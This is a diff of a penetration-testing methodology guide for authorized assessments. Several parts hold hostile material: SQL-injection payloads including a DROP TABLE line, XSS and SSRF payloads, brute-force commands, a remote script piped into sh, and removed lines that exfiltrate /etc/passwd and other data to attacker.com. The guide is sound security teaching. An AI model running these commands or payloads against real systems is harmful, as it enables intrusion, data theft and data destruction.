@@ -1,274 +1,298 @@
 ---
-name: Penetration Testing
-description: Methodology, tools, and techniques for ethical hacking and security assessment of applications and infrastructure
-category: security
-difficulty: advanced
+name: Penetration Testing Methodology
+description: Systematic methodology for web application, network, and API penetration testing
 version: "1.0.0"
 author: ROOT
-tags: [security, penetration-testing, ethical-hacking, OWASP, red-team, vulnerability-assessment]
+tags: [security, penetration-testing, red-team, OWASP, web-app-security, API-security]
 platforms: [all]
+difficulty: advanced
 ---
 
-# Penetration Testing
+# Penetration Testing Methodology
 
-Systematically test systems for security vulnerabilities using attacker techniques in a controlled, authorized manner.
+Structured approach to finding security vulnerabilities before attackers do.
+Always operate within authorized scope — get written permission before any testing.
 
-## Engagement Phases
+## Pre-Engagement
 
 ```
-1. Planning & Scoping
-2. Reconnaissance
-3. Scanning & Enumeration
-4. Exploitation
-5. Post-Exploitation
-6. Reporting
-7. Remediation Verification
+1. Rules of Engagement (RoE): Define scope, timing, testing methods
+2. Scope definition: IP ranges, domains, applications — what is IN and OUT of scope
+3. Emergency contacts: Who to call if something breaks
+4. Test environment preferences: Production or staging?
+5. Legal authorization: Written permission required — no exceptions
 ```
 
-## 1. Planning & Scoping
+## Phase 1: Reconnaissance
 
-### Rules of Engagement (ROE) Checklist
-- [ ] Written authorization from asset owner (get-out-of-jail letter)
-- [ ] Defined scope: IP ranges, domains, applications in scope
-- [ ] Out-of-scope explicitly listed: production databases, third-party systems
-- [ ] Testing window: business hours only, or 24/7?
-- [ ] Escalation contacts: who to call if production system goes down
-- [ ] Data handling: how to handle discovered credentials or PII
-- [ ] Emergency stop procedure: agreed signal to halt testing immediately
+### Passive Recon (No Target Contact)
 
-### Engagement Types
-| Type | Access | Perspective | Use Case |
-|------|--------|-------------|----------|
-| Black box | None | External attacker | Initial attack surface assessment |
-| Gray box | Limited (user-level) | Authenticated attacker | Web app assessment |
-| White box | Full (source code, architecture) | Insider / detailed review | Pre-launch security review |
-| Red team | None | Advanced persistent threat | Realistic attack simulation |
-
-## 2. Reconnaissance
-
-### Passive Recon (OSINT — No Direct Contact with Target)
 ```bash
 # DNS enumeration
-subfinder -d target.com -silent | httpx -silent -status-code
-amass enum -d target.com -passive
+dig +noall +answer @8.8.8.8 target.com ANY
+subfinder -d target.com -o subdomains.txt
+amass enum -passive -d target.com -o amass_results.txt
 
 # Certificate transparency (find subdomains)
-curl -s "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value' | sort -u
+curl "https://crt.sh/?q=%25.target.com&output=json" | jq '.[].name_value'
 
-# Shodan (internet-connected assets)
-shodan search "org:TargetCompany" --fields ip_str,port,org,hostnames
+# ASN and IP range discovery
+whois -h whois.radb.net -- '-i origin AS12345'
 
-# Google dorks
-site:target.com filetype:pdf
-site:target.com inurl:admin
-"target.com" filetype:xlsx OR filetype:csv
+# Email harvesting for phishing simulation
+theHarvester -d target.com -b google,linkedin,shodan
+
+# Shodan for exposed services
+shodan search "org:'Target Company'" --fields ip_str,port,product
 ```
 
-### Active Recon
+### Active Recon (Limited Target Contact)
+
 ```bash
-# Port scanning
-nmap -sV -sC -O -p- --min-rate 5000 -oN nmap_full.txt target.com
+# Port scanning (stealth scan)
+nmap -sS -O -sV -p- --min-rate 1000 target.com -oA initial_scan
+
+# Service version detection
+nmap -sC -sV -p 80,443,8080,8443,22,25,587,993,3306,5432 target.com
 
 # Web technology fingerprinting
-whatweb https://target.com
-wappalyzer https://target.com
+whatweb -v target.com
+wappalyzer --url https://target.com
 
-# Directory enumeration
-ffuf -w /usr/share/wordlists/dirb/common.txt \
-  -u https://target.com/FUZZ \
-  -mc 200,301,302,403 -fc 404 \
-  -o dirs.json -of json
+# Directory brute force
+gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt -x php,html,json -t 50
 
-# Parameter fuzzing
-ffuf -w params.txt -u "https://target.com/api?FUZZ=test" -fs 0
+# DNS zone transfer attempt
+dig axfr target.com @ns1.target.com
 ```
 
-## 3. Scanning & Enumeration
+## Phase 2: Vulnerability Assessment
 
-### Web Application Scanning
-```bash
-# OWASP ZAP active scan
-zap-cli quick-scan --self-contained \
-  --start-options "-config api.disablekey=true" \
-  https://target.com
+### Web Application Testing (OWASP Top 10)
 
-# Nikto web server scanner
-nikto -h https://target.com -ssl -output nikto_report.html
+```python
+# Automated scanning baseline
+def run_web_vuln_scan(target_url: str) -> dict:
+    """Run automated web vulnerability assessment."""
+    results = {}
 
-# Nuclei template-based scanning
-nuclei -u https://target.com \
-  -t cves/ -t vulnerabilities/ -t exposures/ \
-  -severity critical,high,medium \
-  -o nuclei_results.json -json
+    # OWASP ZAP passive + active scan
+    zap = ZAPv2(apikey=ZAP_API_KEY, proxies={"http": "http://localhost:8080"})
+    zap.urlopen(target_url)
+    scan_id = zap.ascan.scan(target_url)
+
+    while int(zap.ascan.status(scan_id)) < 100:
+        time.sleep(5)
+
+    results["zap_alerts"] = [
+        {
+            "name": alert["name"],
+            "risk": alert["risk"],
+            "confidence": alert["confidence"],
+            "url": alert["url"],
+            "solution": alert["solution"]
+        }
+        for alert in zap.core.alerts(baseurl=target_url)
+    ]
+    return results
 ```
 
-### API Testing
-```bash
-# Discover API endpoints
-katana -u https://target.com -jc -d 3 | grep api
+### SQL Injection Testing
 
-# Fuzz API parameters
-ffuf -w api_wordlist.txt \
-  -u "https://target.com/api/v1/FUZZ" \
-  -H "Authorization: Bearer TOKEN" \
-  -mc 200,201,400,403
+```python
+SQL_INJECTION_PAYLOADS = [
+    "' OR '1'='1",
+    "'; DROP TABLE users; --",
+    "' UNION SELECT null, username, password FROM users --",
+    "1'; WAITFOR DELAY '0:0:5' --",  # Time-based blind
+    "1' AND SLEEP(5) --",            # MySQL time-based blind
+    "' AND 1=2 UNION SELECT null, @@version --",  # Version detection
+]
 
-# Test for IDOR (Insecure Direct Object Reference)
-# Change user_id=1234 to user_id=1235, user_id=1, etc.
-curl -H "Authorization: Bearer TOKEN" \
-  https://target.com/api/v1/users/1235/profile
+def test_sql_injection(url: str, parameter: str) -> list:
+    """Test a parameter for SQL injection vulnerability."""
+    findings = []
+
+    for payload in SQL_INJECTION_PAYLOADS:
+        start = time.time()
+        try:
+            response = requests.get(
+                url,
+                params={parameter: payload},
+                timeout=10,
+                allow_redirects=False
+            )
+            elapsed = time.time() - start
+
+            # Time-based blind SQLi detection
+            if "SLEEP" in payload or "WAITFOR" in payload:
+                if elapsed > 4.0:
+                    findings.append({
+                        "type": "time_based_blind_sqli",
+                        "payload": payload,
+                        "delay_seconds": elapsed,
+                        "confidence": "high"
+                    })
+
+            # Error-based detection
+            error_patterns = ["SQL syntax", "mysql_", "ORA-", "DB2 SQL", "Microsoft OLE DB",
+                            "ODBC SQL", "Unclosed quotation", "near \\'"]
+            for pattern in error_patterns:
+                if pattern.lower() in response.text.lower():
+                    findings.append({
+                        "type": "error_based_sqli",
+                        "payload": payload,
+                        "error_pattern": pattern,
+                        "confidence": "high"
+                    })
+
+        except requests.exceptions.Timeout:
+            if "SLEEP" in payload or "WAITFOR" in payload:
+                findings.append({
+                    "type": "time_based_blind_sqli",
+                    "payload": payload,
+                    "confidence": "medium"
+                })
+
+    return findings
 ```
 
-## 4. Exploitation
+### Authentication Testing
 
-### OWASP Top 10 Test Cases
+```python
+def test_authentication_weaknesses(login_url: str, params: dict) -> list:
+    """Test for common authentication vulnerabilities."""
+    findings = []
 
-#### SQL Injection
-```bash
-# Automated testing
-sqlmap -u "https://target.com/products?id=1" \
-  --batch --dbs --level 3 --risk 2
+    # 1. Default credentials
+    DEFAULT_CREDS = [("admin", "admin"), ("admin", "password"), ("admin", ""),
+                    ("root", "root"), ("admin", "admin123")]
+    for username, password in DEFAULT_CREDS:
+        resp = requests.post(login_url, data={**params, "username": username, "password": password})
+        if "logout" in resp.text.lower() or resp.status_code in [302, 200]:
+            if "invalid" not in resp.text.lower() and "incorrect" not in resp.text.lower():
+                findings.append({"type": "default_credentials", "username": username,
+                                 "password": password, "severity": "critical"})
 
-# Manual payload examples
-' OR '1'='1
-' UNION SELECT null, username, password FROM users--
-'; DROP TABLE users;--    # Test only, NEVER run in production
+    # 2. No rate limiting
+    session = requests.Session()
+    failed_attempts = 0
+    for i in range(20):
+        resp = session.post(login_url, data={**params, "username": "test",
+                                            "password": f"wrongpass_{i}"})
+        if resp.status_code != 429:
+            failed_attempts += 1
 
-# Time-based blind injection
-' AND SLEEP(5)--
-' AND 1=(SELECT COUNT(*) FROM users WHERE SLEEP(5))--
+    if failed_attempts >= 15:
+        findings.append({
+            "type": "no_rate_limiting",
+            "attempts": failed_attempts,
+            "severity": "high",
+            "impact": "Brute force attacks possible"
+        })
+
+    # 3. Account enumeration (timing difference for valid vs invalid usernames)
+    valid_time = test_login_timing(login_url, "admin@company.com", "wrongpass")
+    invalid_time = test_login_timing(login_url, "notauser@xyz.com", "wrongpass")
+    if abs(valid_time - invalid_time) > 0.1:  # 100ms timing difference
+        findings.append({
+            "type": "username_enumeration",
+            "timing_difference_ms": abs(valid_time - invalid_time) * 1000,
+            "severity": "medium"
+        })
+
+    return findings
 ```
 
-#### Authentication Attacks
-```bash
-# Password spraying (test with low rate to avoid lockout)
-hydra -L userlist.txt -p "Password123!" target.com http-post-form \
-  "/login:username=^USER^&password=^PASS^:Invalid credentials"
-
-# JWT analysis
-# Decode and examine JWT payload
-echo "eyJ..." | base64 -d
-
-# Test algorithm confusion (RS256 → HS256)
-# Use jwt_tool
-python3 jwt_tool.py TOKEN -X a    # Test algorithm confusion
-```
-
-#### XSS Testing
-```javascript
-// Basic XSS payloads
-<script>alert(document.cookie)</script>
-"><script>alert(1)</script>
-<img src=x onerror=alert(1)>
-javascript:alert(1)
-
-// DOM-based XSS
-#<img src=x onerror=alert(1)>
-```
-
-#### SSRF (Server-Side Request Forgery)
-```bash
-# Basic SSRF
-curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"
-curl "https://target.com/fetch?url=http://internal-service.local/admin"
-
-# Bypass filters
-http://127.0.0.1:80
-http://2130706433   # Decimal IP for 127.0.0.1
-http://[::1]:80     # IPv6 localhost
-```
-
-### Infrastructure Exploitation
-```bash
-# Test for default credentials on discovered services
-nmap --script http-default-accounts target.com
-nmap --script ftp-anon target.com -p 21
-
-# SMB enumeration
-enum4linux -a target.com
-crackmapexec smb target.com -u "" -p ""   # Null session
-
-# SSH brute force (authorized targets only)
-hydra -L users.txt -P passwords.txt ssh://target.com
-```
-
-## 5. Post-Exploitation
-
-### Privilege Escalation (Linux)
-```bash
-# Automated enumeration
-curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
-
-# Manual checks
-sudo -l                              # What can current user sudo?
-find / -perm -4000 2>/dev/null       # SUID binaries
-cat /etc/crontab                     # Cron jobs running as root
-env | grep -i "key\|token\|secret\|pass"  # Env secrets
-```
-
-### Data Exfiltration Simulation
-```bash
-# Simulate DNS exfiltration (demonstrates impact)
-# Send base64-encoded data in DNS query labels
-echo "sensitive-data" | base64 | tr -d '=' | fold -w 63 | \
-  xargs -I{} nslookup {}.attacker.com
-
-# HTTP exfiltration
-curl -X POST https://attacker.com/collect \
-  -d "data=$(cat /etc/passwd | base64)"
-```
-
-## 6. Reporting
-
-### Report Structure
-```markdown
-# Penetration Test Report — [Target] — [Date]
-
-## Executive Summary
-- Engagement scope and duration
-- Risk rating: Critical/High/Medium/Low
-- 3-5 key findings
-- Top recommendations
-
-## Findings Summary Table
-| ID | Severity | Title | Affected Asset | CVSS |
-|----|----------|-------|---------------|------|
-| F-001 | Critical | SQL Injection in login | /api/login | 9.8 |
-
-## Detailed Findings
-### F-001: SQL Injection in /api/login
-- **Risk**: Critical (CVSS 9.8)
-- **Description**: The login endpoint is vulnerable to SQL injection...
-- **Evidence**: [Screenshot/request/response]
-- **Impact**: Full database access, authentication bypass
-- **Remediation**: Use parameterized queries
-- **References**: CWE-89, OWASP A03:2021
-
-## Appendix: Testing Methodology
-## Appendix: Raw Tool Output
-```
+## Phase 3: Exploitation
 
 ### CVSS Scoring for Findings
-- Always calculate CVSS Base Score for each finding
-- Document both theoretical CVSS and contextualized risk (considering compensating controls)
-- Include proof-of-concept evidence without providing "weaponized" exploits in reports
 
-## 7. Remediation Verification
+```python
+def calculate_cvss_v3(attack_vector: str, attack_complexity: str,
+                       privileges_required: str, user_interaction: str,
+                       scope: str, confidentiality: str, integrity: str,
+                       availability: str) -> dict:
+    """Calculate CVSS v3.1 base score."""
+    AV = {"N": 0.85, "A": 0.62, "L": 0.55, "P": 0.2}[attack_vector]
+    AC = {"L": 0.77, "H": 0.44}[attack_complexity]
+    PR_scope_unchanged = {"N": 0.85, "L": 0.62, "H": 0.27}
+    PR_scope_changed = {"N": 0.85, "L": 0.68, "H": 0.50}
+    PR = (PR_scope_changed if scope == "C" else PR_scope_unchanged)[privileges_required]
+    UI = {"N": 0.85, "R": 0.62}[user_interaction]
+    ISC = {"N": 0.0, "L": 0.22, "H": 0.56}
+    ISCconf = ISC[confidentiality]
+    ISCinteg = ISC[integrity]
+    ISCavail = ISC[availability]
 
-- Re-test every finding after the client reports remediation
-- Provide a "close-out" report confirming fixed vs. unresolved findings
-- For Critical findings: verify within 48 hours of reported fix
-- Document the before/after state with evidence
+    ISCBase = 1 - (1 - ISCconf) * (1 - ISCinteg) * (1 - ISCavail)
+    if scope == "U":
+        ISS = 6.42 * ISCBase
+    else:
+        ISS = 7.52 * (ISCBase - 0.029) - 3.25 * (ISCBase - 0.02) ** 15
 
-## Tools Reference
+    exploitability = 8.22 * AV * AC * PR * UI
+    base_score = min(10, round((ISS + exploitability) / 10, 1)) if ISS > 0 else 0
 
-| Category | Tool | Use |
-|----------|------|-----|
-| Recon | Amass, Subfinder, Shodan | Subdomain/asset discovery |
-| Scanning | Nmap, Masscan | Port/service scanning |
-| Web | Burp Suite Pro, ZAP | Web app testing, intercept proxy |
-| Fuzzing | ffuf, Gobuster | Directory/parameter fuzzing |
-| SQLi | SQLMap | Automated SQL injection |
-| Password | Hashcat, John, Hydra | Hash cracking, brute force |
-| Post-exploit | Metasploit, Empire | Post-exploitation framework |
-| Reporting | Dradis, Ghostwriter | Finding tracking, reporting |
+    if base_score == 0:
+        rating = "None"
+    elif base_score < 4.0:
+        rating = "Low"
+    elif base_score < 7.0:
+        rating = "Medium"
+    elif base_score < 9.0:
+        rating = "High"
+    else:
+        rating = "Critical"
+
+    return {"cvss_score": base_score, "severity_rating": rating}
+```
+
+## Phase 4: Reporting
+
+### Finding Documentation Template
+
+```markdown
+## Finding: SQL Injection in User Search Parameter
+
+**Severity**: Critical (CVSS 9.8)
+**Location**: `GET /api/users/search?q=[PAYLOAD]`
+**Evidence**: [Screenshot of SQL error / data disclosure]
+
+### Description
+The `q` parameter on the user search endpoint is vulnerable to SQL injection.
+An unauthenticated attacker can manipulate database queries to extract sensitive data
+or modify database records.
+
+### Proof of Concept
+```
+GET /api/users/search?q=' UNION SELECT null, username, password_hash FROM users --
+HTTP/1.1 200 OK
+
+{
+  "users": [
+    {"id": null, "name": "admin", "email": "5f4dcc3b5aa765d61d8327de..."}
+  ]
+}
+```
+
+### Impact
+An attacker can:
+1. Extract all user credentials from the database
+2. Access sensitive customer data (PII, payment info)
+3. Modify or delete database records
+4. In some configurations, achieve remote code execution
+
+### Remediation
+1. Use parameterized queries / prepared statements:
+   ```python
+   cursor.execute("SELECT * FROM users WHERE name = %s", (user_input,))
+   ```
+2. Input validation: reject strings with SQL metacharacters
+3. Apply principle of least privilege to database account (no DROP/CREATE)
+4. Enable WAF SQL injection protection as defense-in-depth
+
+### References
+- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
+- CWE-89: SQL Injection
+```
